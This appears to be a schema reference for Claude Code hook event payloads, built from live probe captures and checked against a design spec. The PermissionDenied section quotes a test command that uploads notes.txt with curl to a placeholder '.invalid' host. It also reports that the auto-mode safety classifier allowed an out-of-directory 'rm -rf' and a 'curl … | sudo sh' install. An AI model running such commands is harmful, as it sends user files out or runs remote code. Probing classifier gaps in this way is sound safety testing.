{"session_id":"d2658749-e91b-4404-accc-2f2fd1db2c34","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-perm-deny-rule-bash-rm-ldxzdbc6/d2658749-e91b-4404-accc-2f2fd1db2c34.jsonl","cwd":"/tmp/shp-hooks-perm-deny_rule_bash_rm-ldxzdbc6","prompt_id":"b38b8c5c-299d-4870-924a-b0684f3a91cb","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"rm -f ./nofile.txt","description":"Remove the file nofile.txt if it exists"},"tool_use_id":"toolu_011R3Q5t1LeLojde5w8uyG7j"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` | string | always | `Bash`, `Write`, `Read`, `ToolSearch`, `TaskCreate`, `TaskUpdate`, `Agent`, `mcp__shpelicit__ask_name` | MCP tools as `mcp__<server>__<tool>` |
| `tool_input` | object | always | tool-specific, e.g. `{"command":…,"description":…}` | |
| `tool_use_id` | string | always | `toolu_…` | joins to PostToolUse / PostToolUseFailure / PermissionDenied / PostToolBatch |

**Variants and edge cases:**
- Fires **before** the permission decision: also for calls then refused by a deny rule (`--disallowedTools Bash(rm:*)`) or by `dontAsk` (S09).
- Matcher is the tool name (`hook_name` `PreToolUse:Bash`).

**Spec alignment:** aligned.

---

## PermissionRequest

- **Produced by:** Claude Code 2.1.270 (zod `Tle`)
- **Consumed by:** §8 line 883 and line 937 (`needs_you`), line 917; §7 `needs_you_reason` (line 677); §11 line 1684 (Needs-You rail); M1, M4
- **Probe:** `run_probes.py S01 S09` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S09 && python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/I01_interactive/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PermissionRequest","tool_name":"Write","tool_input":{"file_path":"/tmp/shp-outside-shp-hooks-base-dwqg6d95.txt","content":"x"},"permission_suggestions":[{"type":"setMode","mode":"acceptEdits","destination":"session"},{"type":"addDirectories","directories":["/tmp"],"destination":"session"}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` | string | always | `Write` (4), `Bash` (2) | |
| `tool_input` | object | always | | |
| `permission_suggestions` | array | always | `{"type":"setMode","mode":"acceptEdits","destination":"session"}`, `{"type":"addDirectories","directories":[…],"destination":"session"}` | optional in schema |
| `tool_use_id` | — | **never** | — | not in schema; join to PreToolUse by order/`tool_input` |

**Variants and edge cases:**
- `-p` default mode: fires, then the call is auto-refused with no further permission event; the only trace is `PostToolBatch.tool_calls[].tool_response` = `"Claude requested permissions to write to …, but you haven't granted it yet."` (`live/S09_perm_default_write_outside/events.jsonl`). Same with `--permission-prompts none`.
- `dontAsk` mode and deny rules: **no** PermissionRequest (S09).
- TUI: `PermissionRequest` at 15:38:05.762, `Notification{permission_prompt}` 6.0 s later at 15:38:11.797; after the user rejected with Esc, **no** Stop, PostToolUseFailure or PermissionDenied followed — nothing until the next prompt (`live/I01_interactive/events.jsonl`, `steps.txt`).

**Spec alignment:**
- spec line 937 ("or an unresolved `PermissionRequest`"): there is no resolution event for a human rejection in the TUI (I01) and none for the automatic refusal in `-p` (S09); "unresolved" can only be cleared by a later event from the same session (next `UserPromptSubmit`/`PreToolUse`/`Stop`).

---

## PermissionDenied

- **Produced by:** Claude Code 2.1.270 (zod `Cle`; dispatched only when `decisionReason.type==="classifier" && classifier==="auto-mode"`, `binary/runtime-source-snippets.txt` line 22)
- **Consumed by:** §8 line 917 (needs-you); M1
- **Probe:** `run_probes.py S09 S19 S20`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S20`
- **Status:** verified live 2026-09-14 (auto mode on sonnet; model-dependent)

**Real example** (trimmed; full capture: `live/S20_perm_auto_deny/events.jsonl`)

```json
{"session_id":"17120dd4-f47a-48cf-83ae-c0423a558b46","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-perm-auto-deny-jc3ld08x/17120dd4-f47a-48cf-83ae-c0423a558b46.jsonl","cwd":"/tmp/shp-hooks-perm-auto-deny-jc3ld08x","prompt_id":"46703522-6a6f-47a1-ac80-2cffd2dc0402","permission_mode":"auto","effort":{"level":"high"},"hook_event_name":"PermissionDenied","tool_name":"Bash","tool_input":{"command":"curl -s --max-time 3 -X POST --data-binary @notes.txt https://upload.shp-probe.invalid/collect; echo \"exit_code=$?\"","description":"POST notes.txt to external review service"},"tool_use_id":"toolu_012xbjAJQKREKtxwJTMqozBS","reason":"[Data Exfiltration]"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` | string | always | `Bash` | |
| `tool_input` | object | always | | |
| `tool_use_id` | string | always | | |
| `reason` | string | always | `[Data Exfiltration]` | classifier category |

**Variants and edge cases:**
- Not emitted for: `dontAsk` refusal, `--disallowedTools` deny rule, `-p` auto-refusal of a PermissionRequest, `--permission-prompts none`, a TUI Esc rejection (S09, I01).
- `--permission-mode auto` on haiku is silently downgraded (`live/S09_perm_auto_mode_delete_outside/debug-extras.txt`: `auto mode disabled: model claude-haiku-4-5-20251001 does not support auto mode`; payload `permission_mode:"default"`).
- The auto classifier **allowed** `rm -rf <tmp dir outside cwd>` (S19, dir deleted) and `curl … | sudo sh` to a `.invalid` host (S20, ran and failed on DNS).

**Spec alignment:**
- spec line 917 lists PermissionDenied as a needs-you source; reality: it only fires for auto-mode classifier denials, so in `default`/`acceptEdits`/`dontAsk` sessions it never fires.

---

## PostToolUse

- **Produced by:** Claude Code 2.1.270 (zod `yle`)
- **Consumed by:** §8 line 916 (liveness), heuristics 2 and 4; §18 hook write-volume risk (line 2327); M1, M2
- **Probe:** `run_probes.py S01 S11 S17`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S17`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S17_elicitation/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"echo hello","description":"Echo hello"},"tool_response":{"stdout":"hello","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false},"tool_use_id":"toolu_015R8tPjv7FUHuW6MDJj8HpT","duration_ms":49}
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","permission_mode":"default","hook_event_name":"PostToolUse","tool_name":"mcp__shpelicit__ask_name","tool_input":{},"tool_response":[{"type":"text","text":"elicitation response: {\"action\": \"cancel\"}"}],"tool_use_id":"toolu_01EsGpL7uuSqWTHnAZeYDYz3","duration_ms":44}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_name` / `tool_input` / `tool_use_id` | | always | as PreToolUse | |
| `tool_response` | object or array | always | Bash `{stdout,stderr,interrupted,isImage,noOutputExpected[,backgroundTaskId]}`; MCP `[{"type":"text",…}]` | type varies by tool |
| `duration_ms` | int | always | `49`, `44` | optional in schema; excludes permission-prompt and hook time (schema description) |

**Variants and edge cases:** a background Bash call returns immediately with `tool_response.backgroundTaskId` (`live/S11_background_task/events.jsonl`).

**Spec alignment:** aligned.

---

## PostToolUseFailure

- **Produced by:** Claude Code 2.1.270 (zod `Ale`)
- **Consumed by:** §8 line 916, heuristic 3 "failure tail" (last 3 signals `PostToolUseFailure` on the same tool); M2
- **Probe:** `run_probes.py S01`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolUseFailure","tool_name":"Bash","tool_input":{"command":"false","description":"Run false command"},"tool_use_id":"toolu_013bWZG1PyuhUirXuYdNpLV5","error":"Exit code 1","is_interrupt":false,"duration_ms":10}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolUseFailure","tool_name":"Read","tool_input":{"file_path":"/tmp/shp-hooks-base-dwqg6d95/does-not-exist.txt"},"tool_use_id":"toolu_015PGr45dd1pTHmMSM9qUvqX","error":"File does not exist. Note: your current working directory is /tmp/shp-hooks-base-dwqg6d95.","is_interrupt":false,"duration_ms":6}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `error` | string | always | `Exit code 1`, `File does not exist. Note: …` | free text |
| `is_interrupt` | bool | always | `false` | optional in schema |
| `duration_ms` | int | always | `10`, `6` | optional in schema |
| `tool_name` / `tool_input` / `tool_use_id` | | always | | |

**Variants and edge cases:** a tool call refused by permissions (S09) or blocked by a PreToolUse exit 2 (R01) produces **no** PostToolUseFailure; only `PostToolBatch` records it.

**Spec alignment:** aligned for real tool errors; heuristic 3 will not see permission/hook refusals (they surface only in PostToolBatch).

---

## PostToolBatch

- **Produced by:** Claude Code 2.1.270 (zod `Rle`/`vle`)
- **Consumed by:** not subscribed in §8 (lines 912–923); relevant to heuristics 3 and 4
- **Probe:** `run_probes.py S01 S09 R01`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S09 R01`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S09_perm_dontAsk_write_outside/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PostToolBatch","tool_calls":[{"tool_name":"Bash","tool_input":{"command":"echo hello","description":"Echo hello"},"tool_use_id":"toolu_015R8tPjv7FUHuW6MDJj8HpT","tool_response":"hello"}]}
{"session_id":"5d1202ea-3765-459d-8299-8630c710c50d","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-perm-dontAsk-write-outside-6d-5cdt1/5d1202ea-3765-459d-8299-8630c710c50d.jsonl","cwd":"/tmp/shp-hooks-perm-dontAsk_write_outside-6d_5cdt1","prompt_id":"8b1d20c8-b831-4270-a22c-3c54cfc88202","permission_mode":"dontAsk","hook_event_name":"PostToolBatch","tool_calls":[{"tool_name":"Write","tool_input":{"file_path":"/tmp/shp-hooks-victim-9zwf34kf/outside.txt","content":"x"},"tool_use_id":"toolu_012CQgKZPPKKLQx9nH3Qjkbi","tool_response":"Permission to use Write has been denied because Claude Code is running in don't ask mode. IMPORTANT: You *may* attempt t..."}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_calls` | array of `{tool_name, tool_input, tool_use_id, tool_response?}` | always | one entry per call in the batch | `tool_response` here is a **string** (the text the model saw), not the structured PostToolUse object |

**Variants and edge cases:** the only hook event that records permission refusals and hook blocks (`tool_response` = refusal text).

**Spec alignment:** not referenced by the spec; omission matters for heuristic 3 (see PostToolUseFailure).

---

## Stop

- **Produced by:** Claude Code 2.1.270 (zod `xle`, background task `Xz`, cron `Jz`)
- **Consumed by:** §8 lines 887, 918 (classification), lines 962–963, 976, 1025 (`Stop.stop_reason`), heuristic 2 (`last_assistant_message`); §9 mailbox delivery trigger (line 1181); Appendix A line 2531; D12, D24, D34; M2, M3
- **Probe:** `run_probes.py S01 S10 S11 S18` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S10 S11 S18`
- **Status:** partially verified — top-level fields live 2026-09-14 (26 captures). Never observed: `stop_hook_active:true`, a `session_crons` element (always `[]`), and `background_tasks` entries of any type except `shell` (so the `agent_type`/`server`/`tool`/`name` keys are schema only). Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `live/S11_background_task/events.jsonl`, `live/S10_effort_sonnet/events.jsonl`)

```json
{"session_id":"1352aae9-adfa-4f21-bf43-d66b81709640","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-bg-0dhnzsgh/1352aae9-adfa-4f21-bf43-d66b81709640.jsonl","cwd":"/tmp/shp-hooks-bg-0dhnzsgh","prompt_id":"35dc50eb-7f18-4848-8923-fc9a3eabcce0","permission_mode":"default","hook_event_name":"Stop","stop_hook_active":false,"last_assistant_message":"STARTED","background_tasks":[{"id":"bx4s43qvk","type":"shell","status":"running","description":"Background sleep and echo command","command":"sleep 25 && echo bgdone"}],"session_crons":[]}
{"session_id":"5c59934b-3bd1-43ab-9506-a6a16f581034","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-effort-7yb7myuc/5c59934b-3bd1-43ab-9506-a6a16f581034.jsonl","cwd":"/tmp/shp-hooks-effort-7yb7myuc","prompt_id":"a95c9922-3b49-44f2-8906-ef313239b6c1","permission_mode":"default","effort":{"level":"low"},"hook_event_name":"Stop","stop_hook_active":false,"last_assistant_message":"DONE","background_tasks":[],"session_crons":[]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `stop_hook_active` | bool | always | `false` | |
| `last_assistant_message` | string | always | final assistant text | optional in schema |
| `background_tasks` | array of `{id,type,status,description,command?,agent_type?,server?,tool?,name?}` | always | `[]`; `[{"id":"bx4s43qvk","type":"shell","status":"running",…}]` | |
| `session_crons` | array of `{id,schedule,recurring,prompt}` | always | `[]` | |
| `stop_reason` | — | **never** | — | not in the schema and never observed |

**Variants and edge cases:**
- Fires once per turn, not once per session: S18 had two (`Stop`, then an injected `<task-notification>` `UserPromptSubmit`, then `Stop`).
- In `-p`, a turn that ends with a running background shell gets `Stop` and then the process kills the shell 5 s later with no `SessionEnd` (S11).
- A human rejection of a permission prompt in the TUI ends the turn with **no** Stop (I01).
- Hitting the output cap does not produce `Stop`; it produces `StopFailure{error:max_output_tokens}` (S08_mock_max_tokens).

**Spec alignment:**
- spec lines 962, 963, 976, 1025 and 2531 key rules on `Stop.stop_reason` (`max_tokens`, `tool_use`, `end_turn`); reality: `Stop` has no `stop_reason` field (26 captures; binary schema `xle`). Truncation arrives as `StopFailure.error = max_output_tokens`; `end_turn` vs `tool_use` must come from the transcript.
- spec line 1181 (mailbox delivers on `Stop`): aligned for normal turns; no Stop after a TUI permission rejection (I01).

---

## StopFailure

- **Produced by:** Claude Code 2.1.270 (zod `Ile`, error enum `o_`, dispatcher `pet()` in `binary/runtime-source-snippets.txt` line 18)
- **Consumed by:** §8 lines 887, 918, 951–971 (mechanical `stop_reason` table); §18 line 2330; D21, D24; M1, M2
- **Probe:** `run_probes.py S07 S08`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S07 S08`
- **Status:** partially verified — payload shape live 2026-09-14. Only `model_not_found` came from the real API. Seven more values were provoked by the real CLI against a local mock API (simulated HTTP errors). Five enum values were never observed: `oauth_org_not_allowed`, `account_on_hold`, `verification_required`, `overloaded`, `cloud_credential_error`. Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `live/S07_bad_model/events.jsonl` [real API]; `live/S08_mock_prompt_too_long/events.jsonl`, `live/S08_mock_http529/events.jsonl` [mock API])

```json
{"session_id":"8fd6aa9e-7844-413d-950c-467608919cd5","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-badmodel-29lh7ct7/8fd6aa9e-7844-413d-950c-467608919cd5.jsonl","cwd":"/tmp/shp-hooks-badmodel-29lh7ct7","prompt_id":"dd06b403-5548-4081-b16c-4eb5e30cf88b","effort":{"level":"high"},"hook_event_name":"StopFailure","error":"model_not_found","last_assistant_message":"There's an issue with the selected model (claude-nonexistent-model-shp). It may not exist or you may not have access to ..."}
{"session_id":"817ffc30-1a65-48b1-9908-80b79e8a9204","transcript_path":"/tmp/shp-hooks-mock-prompt_too_long-e5we4qw3/cfg/projects/-tmp-shp-hooks-mock-prompt-too-long-e5we4qw3/817ffc3...","cwd":"/tmp/shp-hooks-mock-prompt_too_long-e5we4qw3","prompt_id":"1dc08d75-e877-47cc-aa79-25133a624f80","hook_event_name":"StopFailure","error":"invalid_request","error_details":"400 {\"type\":\"error\",\"error\":{\"type\":\"invalid_request_error\",\"message\":\"prompt is too long: 250000...","last_assistant_message":"Prompt is too long · the request is ~250000 tokens (limit 200000) but this conversation is only ~2157 tokens —..."}
{"session_id":"78743a17-9a6a-48d1-bf06-92bc067b750f","transcript_path":"/tmp/shp-hooks-mock-http529-rlkf4sfy/cfg/projects/-tmp-shp-hooks-mock-http529-rlkf4sfy/78743a17-9a6a-48d1-bf06-92bc067b7...","cwd":"/tmp/shp-hooks-mock-http529-rlkf4sfy","prompt_id":"4cfdecca-a0f9-4c9b-9221-b1204442fb98","hook_event_name":"StopFailure","error":"server_error","last_assistant_message":"API Error: 529 Overloaded. This is a server-side issue, usually temporary — try again in a moment. If it persists, check..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `error` | enum | always | `model_not_found`, `authentication_failed`, `billing_error`, `rate_limit`, `server_error`, `invalid_request`, `max_output_tokens`, `unknown` | see Enumerations for the full list and the stimulus→value map |
| `error_details` | string | sometimes (1/23) | raw API error body (`prompt_too_long`) | |
| `last_assistant_message` | string | always | the user-facing error text | |
| `permission_mode` | — | never | — | `pet()` passes `undefined` |
| `effort` | object | sometimes (13/23) | `{"level":"high"}` | present when the (claimed) model supports effort |

**Variants and edge cases:**
- **Delivery race in `-p`.** StopFailure is dispatched after shutdown has begun (`[uds-messaging] Shutting down` at 15:15:12.569 comes before the hook lines, `live/S07_bad_model/debug-extras.txt`). In S07 the Python `capture_env.py` hook `completed with status 1` and wrote nothing, while the fork-free bash capture `completed with status 0` (`live/S07_bad_model/debug-hooklines.txt`). R04 showed the same thing: status 1, and its `env.jsonl` has only a SessionStart record. `capture_env.py` catches `BaseException` and always exits 0, so status 1 with no output fits a process killed at exit. That cause is inferred; no signal was recorded. Observed 2/2 for StopFailure. A Python hook on a normal `-p` SessionEnd (S01) completed with status 0.
- Retries: the real 404 was tried streaming, then non-streaming, before StopFailure (two `API error (attempt 1/11)` lines in `live/S07_bad_model/debug-extras.txt`); mock runs set `CLAUDE_CODE_MAX_RETRIES=0`.
- The matcher value is `error` (`StopFailure:model_not_found` in debug).

**Spec alignment:**
- spec lines 951, 956, 971 say `StopFailure` carries `error_type`; reality: the field is `error` (`live/S07_bad_model/events.jsonl`).
- spec line 956 maps `overloaded` → `rate_limited`; reality: a 529 produced `error:"server_error"` ("The API is at capacity"/"529 Overloaded", `live/S08_mock_http529`) and the binary contains 0 assignments of `error:"overloaded"` (`binary/stopfailure-error-assignments.txt`). Would classify 529 as `server_error`, not `rate_limited`.
- spec line 960 maps `invalid_request` → `bad_request`; reality: a plain 400 produced `error:"unknown"` (`live/S08_mock_http400`); only special 400s map to `invalid_request` (prompt too long) or `billing_error` (credit balance).
- spec lines 958–960 omit `verification_required` and `cloud_credential_error` (binary enum `o_`).
- spec line 962 `= max_output_tokens`: aligned (`live/S08_mock_max_tokens`, mock).
- spec line 2330 ("documented, not observed"): now observed.

---

## SubagentStart

- **Produced by:** Claude Code 2.1.270 (zod `Dle`)
- **Consumed by:** §8 line 885 (`active_subagents`), line 919; §7 line 679; M1
- **Probe:** `run_probes.py S01 S18`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S18`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","agent_id":"a7154de3fc719065c","agent_type":"general-purpose","hook_event_name":"SubagentStart"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `agent_id` | string | always | `a7154de3fc719065c` | also the id inside `<task-notification>` |
| `agent_type` | string | always | `general-purpose`, `shpprobe` | |
| `permission_mode` | — | never | — | |

**Variants and edge cases:** for an async-launched Agent call (`tool_response.status:"async_launched"`, S18) `SubagentStart` (15:23:44.780) and `PostToolUse{Agent}` (15:23:44.782) are 2 ms apart and their capture lines landed in the opposite order; do not rely on arrival order. The subagent's result later arrives as an injected `<task-notification>` prompt (see UserPromptSubmit).

**Spec alignment:** aligned in shape; see SubagentStop for the counter problem.

---

## SubagentStop

- **Produced by:** Claude Code 2.1.270 (zod `Nle`)
- **Consumed by:** §8 line 885 (`active_subagents`), line 919; §7 line 679; M1
- **Probe:** `run_probes.py S01 S05 S18` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S05`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `live/S01_startup_tools/events.jsonl`, `live/S05_compact/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","agent_id":"a7154de3fc719065c","agent_type":"general-purpose","hook_event_name":"SubagentStop","stop_hook_active":false,"agent_transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6/subagents/agent-a7154de3fc71906...","last_assistant_message":"Done.","background_tasks":[],"session_crons":[]}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","permission_mode":"default","agent_id":"a76c715e3814aa492","agent_type":"","hook_event_name":"SubagentStop","stop_hook_active":false,"agent_transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6/subagents/agent-a76c715e3814aa4...","last_assistant_message":"<analysis>\nThe conversation consists of a single, structured request from the user to execute a specific sequence of 7 ...","background_tasks":[],"session_crons":[]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `agent_id` | string | always | | |
| `agent_type` | string | always | `general-purpose`, `shpprobe`, `""` (2/4) | `""` = internal subagent |
| `agent_transcript_path` | string | always | `…/<session_id>/subagents/agent-<agent_id>.jsonl` | |
| `last_assistant_message` | string | sometimes (3/4) | | |
| `stop_hook_active` / `background_tasks` / `session_crons` | | always | as Stop | |

**Variants and edge cases:** internal subagents emit **SubagentStop without SubagentStart**: compaction (`live/S05_compact`, `agent_type:""`, `last_assistant_message` = the compaction analysis) and a post-turn agent 7.5 s after Stop in the TUI (`live/I01_interactive`, 15:38:46.760).

**Spec alignment:**
- spec line 885 (`active_subagents` from `SubagentStart`/`SubagentStop`): a naive +1/−1 counter goes negative — 2 of 4 SubagentStop captures had no matching SubagentStart (`live/S05_compact/events.jsonl`, `live/I01_interactive/events.jsonl`). Count by `agent_id` pairing and ignore `agent_type:""`.

---

## TaskCreated / TaskCompleted

- **Produced by:** Claude Code 2.1.270 (zod `Gle` / `Vle`)
- **Consumed by:** §8 line 884 and heuristic 1 (open task ledger); §7 `tasks_done`/`tasks_total` (line 678); §18 line 2330; M1, M2
- **Probe:** `run_probes.py S01 S18`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S18`
- **Status:** partially verified — `task_id`, `task_subject`, `task_description` live 2026-09-14; optional `teammate_name`/`team_name` (agent teams) never observed. Audit: downgraded from "verified"

**Real example** (trimmed; full capture: `live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"TaskCreated","task_id":"1","task_subject":"probe task","task_description":"Probe task for testing hooks"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"TaskCompleted","task_id":"1","task_subject":"probe task","task_description":"Probe task for testing hooks"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `task_id` | string | always | `"1"`, `"2"` | small per-session counter, not a UUID |
| `task_subject` | string | always | `probe task`, `alpha`, `beta` | |
| `task_description` | string | always | | optional in schema |
| `teammate_name` / `team_name` | string | never observed | — | agent teams only |
| `permission_mode` | — | never | — | |

**Variants and edge cases:**
- `TaskCompleted` fires inside the `TaskUpdate{status:"completed"}` tool call, between its PreToolUse and PostToolUse.
- S18 created 2, completed 1, then stopped: the ledger shows 1 open task at `Stop` (heuristic 1 input available).
- Task deletion/other statuses not probed.

**Spec alignment:** aligned (spec line 884; line 2330 "documented, not observed" is now observed).

---

## Notification

- **Produced by:** Claude Code 2.1.270 (zod `wle`; dispatcher `ZT()`, matcher = `notification_type`, `binary/enums.json`)
- **Consumed by:** §8 line 883, 917, 937, 945 (`needs_you`), line 957 (`quota_paused`); §7 `needs_you_reason` (line 677); §18 line 2330; M1, M2
- **Probe:** `interactive_probe.py` (TUI) + `run_probes.py S17` (`-p`). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** partially verified — `permission_prompt`, `idle_prompt` (TUI) and `elicitation_response` (`-p`) live; other types binary only

**Real example** (trimmed; full captures: `live/I01_interactive/events.jsonl`, `live/S17_elicitation/events.jsonl`)

```json
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","prompt_id":"190ccd82-3a5c-48e4-b9e2-3d288b7fbd37","hook_event_name":"Notification","message":"Claude needs your permission","notification_type":"permission_prompt"}
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","prompt_id":"5509caee-21b7-463a-9276-d8ae39794110","hook_event_name":"Notification","message":"Claude is waiting for your input","notification_type":"idle_prompt"}
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","hook_event_name":"Notification","message":"Elicitation response for server \"shpelicit\": cancel","notification_type":"elicitation_response"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `message` | string | always | `Claude needs your permission`, `Claude is waiting for your input`, `Elicitation response for server "shpelicit": cancel` | |
| `notification_type` | string | always | `permission_prompt`, `idle_prompt`, `elicitation_response` | schema types it as free string |
| `title` | string | never observed | — | optional |
| `permission_mode` | — | never | — | |

**Variants and edge cases:**
- `permission_prompt` arrived 6.0 s after `PermissionRequest` (I01).
